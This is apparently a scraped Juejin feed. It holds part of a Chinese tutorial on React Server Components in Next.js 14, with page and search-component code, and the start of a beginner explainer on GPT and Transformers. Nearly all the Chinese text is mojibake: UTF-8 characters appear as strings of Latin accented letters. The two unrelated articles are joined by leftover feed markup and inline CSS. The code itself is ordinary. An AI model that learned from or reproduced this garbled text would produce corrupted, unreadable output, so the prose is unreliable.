<p>è¿™ç¯‡æ–‡ç« ä¸èŠæ™¦æ¶©çš„åŸç†ï¼Œåªè®²RSCè½åœ°çš„â€œè®¤çŸ¥-å®æˆ˜-é¿å‘â€å…¨æµç¨‹ã€‚ä»â€œä¸ºä»€ä¹ˆRSCçªç„¶ç«äº†â€åˆ°â€œNext.js 14å®æˆ˜è¸©é›·â€ï¼Œå†åˆ°â€œæ€§èƒ½ä¼˜åŒ–çš„å…³é”®æŠ€å·§â€ï¼Œå¸¦ä½ åƒé€è¿™ä¸ªæ”¹å˜å‰ç«¯æ¶æ„çš„çƒ­ç‚¹æŠ€æœ¯ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€è®¤çŸ¥æ¾„æ¸…æœŸï¼šå…ˆææ‡‚RSCä¸æ˜¯ä»€ä¹ˆ</h2>
<p>æ¥è§¦RSCçš„ç¬¬ä¸€ä¸ªæœˆï¼Œæˆ‘è¸©çš„æœ€å¤§å‘æ˜¯â€œæŠŠå®ƒå½“SSRçš„å‡çº§ç‰ˆâ€ã€‚ç›´åˆ°çº¿ä¸Šå‡ºç°â€œæ°´åˆé”™è¯¯â€æ‰æ˜ç™½ï¼šRSCçš„æ ¸å¿ƒæ˜¯â€œç»„ä»¶è¿è¡Œç¯å¢ƒçš„æ‹†åˆ†â€ï¼Œè€Œéâ€œæ¸²æŸ“ä½ç½®çš„è½¬ç§»â€ã€‚å…ˆç”¨ä¸€å¼ è¡¨å˜æ¸…è¯¯åŒºï¼š</p>





























<table><thead><tr><th>æŠ€æœ¯æ–¹æ¡ˆ</th><th>æ ¸å¿ƒé€»è¾‘</th><th>èµ„æºåŠ è½½</th><th>æœ€å¤§ç—›ç‚¹</th></tr></thead><tbody><tr><td>ä¼ ç»ŸCSR</td><td>å®¢æˆ·ç«¯åŠ è½½JSåæ¸²æŸ“ç»„ä»¶</td><td>é¦–å±JSä½“ç§¯å¤§ï¼ŒåŠ è½½æ…¢</td><td>ç™½å±æ—¶é—´é•¿ï¼ŒSEOå·®</td></tr><tr><td>SSRï¼ˆå¦‚Next.js 13å‰ï¼‰</td><td>æœåŠ¡ç«¯æ¸²æŸ“HTMLï¼Œå®¢æˆ·ç«¯æ°´åˆ</td><td>é¦–å±HTMLå¿«ï¼Œä½†éœ€åŠ è½½å®Œæ•´JSæ°´åˆ</td><td>æ°´åˆå¼€é”€å¤§ï¼Œäº¤äº’å»¶è¿Ÿ</td></tr><tr><td>RSCï¼ˆNext.js 14ï¼‰</td><td>æœåŠ¡å™¨ç»„ä»¶è·‘æœåŠ¡ç«¯ï¼Œå®¢æˆ·ç«¯ç»„ä»¶è·‘æµè§ˆå™¨</td><td>ä»…ä¼ è¾“å®¢æˆ·ç«¯ç»„ä»¶JSï¼ŒæœåŠ¡å™¨ç»„ä»¶æ— JS</td><td>ç¯å¢ƒåŒºåˆ†å¤æ‚ï¼Œæ˜“å‡ºç°è·¨ç«¯é”™è¯¯</td></tr></tbody></table>
<p>æ ¸å¿ƒç»“è®ºï¼šRSCè§£å†³çš„æ˜¯â€œæ— æ•ˆJSä¼ è¾“â€é—®é¢˜â€”â€”æœåŠ¡å™¨ç»„ä»¶è´Ÿè´£æ•°æ®è·å–å’Œé™æ€UIï¼Œä¸ç”Ÿæˆå®¢æˆ·ç«¯JSï¼›åªæœ‰éœ€è¦äº¤äº’çš„éƒ¨åˆ†ç”¨å®¢æˆ·ç«¯ç»„ä»¶ï¼Œå®ç°â€œæŒ‰éœ€åŠ è½½JSâ€ã€‚</p>
<h2 data-id="heading-1">äºŒã€å®æˆ˜è½åœ°æœŸï¼šNext.js 14æ­å»ºRSCé¡¹ç›®çš„5æ­¥æµç¨‹</h2>
<p>Next.js 14æ˜¯ç›®å‰æœ€æˆç†Ÿçš„RSCå¼€å‘æ¡†æ¶ï¼Œé»˜è®¤å¯ç”¨App Routerï¼ŒæœåŠ¡å™¨ç»„ä»¶æ— éœ€é¢å¤–é…ç½®ã€‚ç»“åˆæˆ‘é‡æ„ç”¨æˆ·ç®¡ç†ç³»ç»Ÿçš„ç»éªŒï¼Œåˆ†äº«ä»0åˆ°1çš„è½åœ°æ­¥éª¤ï¼š</p>
<h3 data-id="heading-2">2.1 ç¯å¢ƒåˆå§‹åŒ–ï¼šé¿å¼€ç‰ˆæœ¬å…¼å®¹å‘</h3>
<p>RSCå¯¹Reactç‰ˆæœ¬è¦æ±‚ä¸¥æ ¼ï¼Œå¿…é¡»ä½¿ç”¨React 18.3+ã€‚åˆå§‹åŒ–æ—¶ç›´æ¥æŒ‡å®šNext.js 14ï¼Œé¿å…å› ä¾èµ–å†²çªå¯¼è‡´çš„â€œæœåŠ¡å™¨ç»„ä»¶æ— æ³•è¯†åˆ«â€é—®é¢˜ï¼š</p>
<pre><code class="hljs language-perl" lang="perl">// æ­£ç¡®åˆå§‹åŒ–å‘½ä»¤
npx create-<span class="hljs-keyword">next</span>-app@latest rsc-demo --example <span class="hljs-string">"https://github.com/vercel/next-learn/tree/main/react-foundations/rsc/01-intro"</span>
<span class="hljs-comment"># é€‰æ‹©App Routerï¼Œå¯ç”¨TypeScriptå’ŒESLint</span>
</code></pre>
<p>å®‰è£…å®Œæˆåï¼Œæ£€æŸ¥package.jsonä¾èµ–ï¼šç¡®ä¿react@^18.3.1ã€next@^14.0.3ï¼Œè¿™æ˜¯RSCè¿è¡Œçš„åŸºç¡€ã€‚</p>
<h3 data-id="heading-3">2.2 ç»„ä»¶åŒºåˆ†ï¼šç”¨â€œuse clientâ€åˆ’æ¸…è¾¹ç•Œ</h3>
<p>è¿™æ˜¯RSCå¼€å‘çš„æ ¸å¿ƒè§„åˆ™ï¼š<strong>ä¸å†™â€œuse clientâ€çš„å°±æ˜¯æœåŠ¡å™¨ç»„ä»¶</strong>ã€‚æˆ‘æ›¾å› æ¼å†™å¯¼è‡´â€œuseState is not definedâ€é”™è¯¯ï¼Œå› ä¸ºæœåŠ¡å™¨ç»„ä»¶ä¸æ”¯æŒReact Hooksã€‚</p>
<p>å®æˆ˜æ¡ˆä¾‹ï¼šç”¨æˆ·åˆ—è¡¨é¡µæ‹†åˆ†â€”â€”æœåŠ¡å™¨ç»„ä»¶è´Ÿè´£è·å–æ•°æ®å’Œæ¸²æŸ“è¡¨æ ¼ï¼Œå®¢æˆ·ç«¯ç»„ä»¶è´Ÿè´£æœç´¢æ¡†äº¤äº’ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æœåŠ¡å™¨ç»„ä»¶ï¼šapp/users/page.tsxï¼ˆæ— éœ€use clientï¼‰</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getUsers</span>(<span class="hljs-params">searchKey = <span class="hljs-string">''</span></span>) {
  <span class="hljs-comment">// æœåŠ¡å™¨ç»„ä»¶æ”¯æŒé¡¶å±‚awaitï¼Œç›´æ¥å‘èµ·åç«¯è¯·æ±‚ï¼ˆæ— è·¨åŸŸé—®é¢˜ï¼‰</span>
  <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`https://api.example.com/users?keyword=<span class="hljs-subst">${searchKey}</span>`</span>, {
    <span class="hljs-attr">cache</span>: <span class="hljs-string">'no-store'</span> <span class="hljs-comment">// å®æ—¶æ•°æ®ç¦ç”¨ç¼“å­˜ï¼Œé™æ€æ•°æ®å¯ç”¨force-cache</span>
  });
  <span class="hljs-keyword">if</span> (!res.<span class="hljs-property">ok</span>) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'æ•°æ®è·å–å¤±è´¥'</span>);
  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>();
}

<span class="hljs-comment">// æ¥æ”¶å®¢æˆ·ç«¯ç»„ä»¶ä¼ é€’çš„æœç´¢å‚æ•°ï¼ˆé€šè¿‡URL SearchParamsï¼‰</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">UsersPage</span>(<span class="hljs-params">{
  searchParams
}: {
  searchParams?: { keyword?: string }
}</span>) {
  <span class="hljs-keyword">const</span> users = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getUsers</span>(searchParams?.<span class="hljs-property">keyword</span> || <span class="hljs-string">''</span>);
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"container mx-auto p-4"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"text-2xl font-bold mb-6"</span>&gt;</span>ç”¨æˆ·ç®¡ç†<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
      {/* å‘å®¢æˆ·ç«¯ç»„ä»¶ä¼ é€’é»˜è®¤æœç´¢å€¼ */}
      <span class="hljs-tag">&lt;<span class="hljs-name">UserSearch</span> <span class="hljs-attr">defaultKeyword</span>=<span class="hljs-string">{searchParams?.keyword</span> || ''} /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"mt-6 overflow-x-auto"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"w-full border-collapse"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">thead</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"bg-gray-100"</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">th</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"border p-3 text-left"</span>&gt;</span>ID<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">th</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"border p-3 text-left"</span>&gt;</span>å§“å<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">th</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"border p-3 text-left"</span>&gt;</span>è§’è‰²<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">th</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"border p-3 text-left"</span>&gt;</span>æ“ä½œ<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">thead</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">tbody</span>&gt;</span>
            {users.map((user: { id: number; name: string; role: string }) =&gt; (
              <span class="hljs-tag">&lt;<span class="hljs-name">tr</span> <span class="hljs-attr">key</span>=<span class="hljs-string">{user.id}</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"hover:bg-gray-50"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"border p-3"</span>&gt;</span>{user.id}<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"border p-3"</span>&gt;</span>{user.name}<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"border p-3"</span>&gt;</span>{user.role}<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"border p-3"</span>&gt;</span>
                  {/* æ“ä½œæŒ‰é’®éœ€äº¤äº’ï¼Œå¼•å…¥å°å‹å®¢æˆ·ç«¯ç»„ä»¶ */}
                  <span class="hljs-tag">&lt;<span class="hljs-name">UserAction</span> <span class="hljs-attr">userId</span>=<span class="hljs-string">{user.id}</span> /&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
              <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
            ))}
          <span class="hljs-tag">&lt;/<span class="hljs-name">tbody</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}

<span class="hljs-comment">// å®¢æˆ·ç«¯ç»„ä»¶ï¼šapp/users/UserSearch.tsxï¼ˆå¿…é¡»åŠ use clientï¼‰</span>
<span class="hljs-string">'use client'</span>;
<span class="hljs-keyword">import</span> { useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">import</span> { useRouter } <span class="hljs-keyword">from</span> <span class="hljs-string">'next/navigation'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">UserSearch</span>(<span class="hljs-params">{ defaultKeyword }: { defaultKeyword: string }</span>) {
  <span class="hljs-comment">// å®¢æˆ·ç«¯ç»„ä»¶å¯ä½¿ç”¨Hooksç®¡ç†äº¤äº’çŠ¶æ€</span>
  <span class="hljs-keyword">const</span> [keyword, setKeyword] = <span class="hljs-title function_">useState</span>(defaultKeyword);
  <span class="hljs-keyword">const</span> router = <span class="hljs-title function_">useRouter</span>();

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleSearch</span> = (<span class="hljs-params">e: React.FormEvent</span>) =&gt; {
    e.<span class="hljs-title function_">preventDefault</span>();
    <span class="hljs-comment">// é€šè¿‡è·¯ç”±ä¼ é€’æœç´¢å‚æ•°ï¼Œè§¦å‘æœåŠ¡å™¨ç»„ä»¶é‡æ–°è·å–æ•°æ®</span>
    router.<span class="hljs-title function_">push</span>(<span class="hljs-string">`/users?keyword=<span class="hljs-subst">${<span class="hljs-built_in">encodeURIComponent</span>(keyword)}</span>`</span>);
  };

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">onSubmit</span>=<span class="hljs-string">{handleSearch}</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"flex gap-2"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span>
        <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span>
        <span class="hljs-attr">value</span>=<span class="hljs-string">{keyword}</span>
        <span class="hljs-attr">onChange</span>=<span class="hljs-string">{(e)</span> =&gt;</span> setKeyword(e.target.value)}
        placeholder="è¾“å…¥ç”¨æˆ·åæœç´¢"
        className="flex-1 p-2 border rounded"
      /&gt;
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"px-4 py-2 bg-blue-500 text-white rounded"</span>&gt;</span>
        æœç´¢
      <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span>
  );
}
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å°çŒ«éƒ½èƒ½æ‡‚çš„å¤§æ¨¡å‹åŸç† 2 - åˆè§å¤§è¯­è¨€æ¨¡å‹]]></title>    <link>https://juejin.cn/post/7580674010838761518</link>    <guid>https://juejin.cn/post/7580674010838761518</guid>    <pubDate>2025-12-08T03:27:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580674010838761518" data-draft-id="7580303864604180489" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å°çŒ«éƒ½èƒ½æ‡‚çš„å¤§æ¨¡å‹åŸç† 2 - åˆè§å¤§è¯­è¨€æ¨¡å‹"/> <meta itemprop="keywords" content="LLM,Agent,ç¨‹åºå‘˜"/> <meta itemprop="datePublished" content="2025-12-08T03:27:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¤§æ¨¡å‹æ•™ç¨‹"/> <meta itemprop="url" content="https://juejin.cn/user/1145012233707299"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å°çŒ«éƒ½èƒ½æ‡‚çš„å¤§æ¨¡å‹åŸç† 2 - åˆè§å¤§è¯­è¨€æ¨¡å‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1145012233707299/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¤§æ¨¡å‹æ•™ç¨‹
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T03:27:28.000Z" title="Mon Dec 08 2025 03:27:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>æœ¬æ–‡è¾ƒé•¿ï¼Œå»ºè®®ç‚¹èµæ”¶è—ã€‚æ›´å¤šAIå¤§æ¨¡å‹åº”ç”¨å¼€å‘å­¦ä¹ è§†é¢‘åŠèµ„æ–™ï¼Œåœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fhy.zhipoai.cn%2F" target="_blank" title="https://hy.zhipoai.cn/" ref="nofollow noopener noreferrer">æ™ºæ³ŠAI</a>ã€‚</p>
</blockquote>
<p>ç°åœ¨å¤§å®¶é‡åˆ°é—®é¢˜ï¼Œç¬¬ä¸€ååº”éƒ½ä¸æ˜¯ä½¿ç”¨æœç´¢å¼•æ“ï¼Œè€Œæ˜¯é—® chatGPTï¼Œchat å¤§å®¶éƒ½çŸ¥é“æ˜¯èŠå¤©çš„æ„æ€ï¼Œä½†æ˜¯Â <strong>GPT</strong>Â å®ƒåˆ°åº•æ˜¯ä¸ªä»€ä¹ˆå‘¢ï¼Ÿ</p>
<p>å±•å¼€ä¸€ä¸‹å…¨åï¼šGenerative Pretrained Transformerï¼Œç¿»è¯‘è¿‡æ¥å°±æ˜¯<strong>ç”Ÿæˆå¼é¢„è®­ç»ƒ Transformer</strong>ã€‚</p>
<p>æ‰€ä»¥åœ¨æ­¤ä¹‹å‰æˆ‘ä»¬éœ€è¦æ›´æ¸…æ¥šçŸ¥é“Â <strong>Transformer</strong>Â åˆ°åº•æ˜¯ä¸ªå•¥ã€‚</p>
<h2 data-id="heading-0">Transformer æ¶æ„</h2>
<p>è¯´åˆ° Transformer è¿˜æ˜¯ä¸èƒ½ä¸æå…¶æºå¤´ï¼Œé¼é¼å¤§åçš„ã€ŠAttention Is All You Needã€‹ï¼Œè¿™ç¯‡è®ºæ–‡æå‡ºäº†è¿™ä¸ªåä¸º Transformer çš„æ·±åº¦ç¥ç»ç½‘ç»œæ¶æ„ã€‚</p>
<p>åœ¨è®ºæ–‡é‡Œé¢ï¼Œè¿™ä¸ªæ¶æ„æ˜¯é•¿è¿™æ ·çš„ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/45d462621ea14486aadc15533178c5a5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765769248&amp;x-signature=Bl1ubRftV9Uvu0S0n2XKU1YG1LI%3D" alt="" loading="lazy"/></p>
<p>å…¶æ ¸å¿ƒå°±æ˜¯<strong>è‡ªæ³¨æ„åŠ›æœºåˆ¶</strong>ã€‚</p>
<p>æ³¨ï¼šåæ¥å¾ˆå¤š GPT åªä¿ç•™äº† decoderã€‚</p>
<h2 data-id="heading-1">æœ€åŸºæœ¬çš„åŸç†</h2>
<p>å›å¿†ä¸€ä¸‹ç¥ç»ç½‘ç»œï¼Œæˆ‘ä»¬çš„è¾“å…¥å’Œè¾“å‡ºï¼Œç»è¿‡ç¥ç»ç½‘ç»œè®­ç»ƒä¸€é¡¿æ“ä½œï¼è°ƒæ•´å¥½æƒé‡ï¼Œå°±èƒ½è¾“å‡ºåƒæ¨¡åƒæ ·çš„ç­”æ¡ˆã€‚</p>
<p>é‚£ä¹ˆå¯¹æ–‡å­—æ˜¯ä¸æ˜¯ä¹Ÿèƒ½è¿™ä¹ˆæ“ä½œå‘¢ï¼Ÿæ²¡é”™çš„ï¼Œäº‹å®è¯æ˜å®Œå…¨å¯ä»¥ã€‚</p>
<p>å› ä¸ºæ–‡å­—è¿™ä¸ªä¸œè¥¿ï¼Œç°æˆçš„æ­£ç¡®ç­”æ¡ˆçœŸçš„å¤ªå¤šå•¦ï¼Œæˆ‘ä»¬è®­ç»ƒçš„æ—¶å€™å¯ä»¥è¿™æ ·ï¼š</p>
<pre><code class="hljs">è¾“å…¥ï¼šç•ªèŒ„æ˜¯  
æ­£ç¡®ç»“æœï¼šç•ªèŒ„æ˜¯çº¢
</code></pre>
<p>å¦‚æœçŒœåˆ°çš„ä¸æ˜¯çº¢ï¼Œé‚£å°±<strong>è®¡ç®—æŸå¤±</strong>ï¼ŒæŠŠæƒé‡å¾€å¯¹çš„é‚£è¾¹å‡¹ä¸€ä¸‹ã€‚</p>
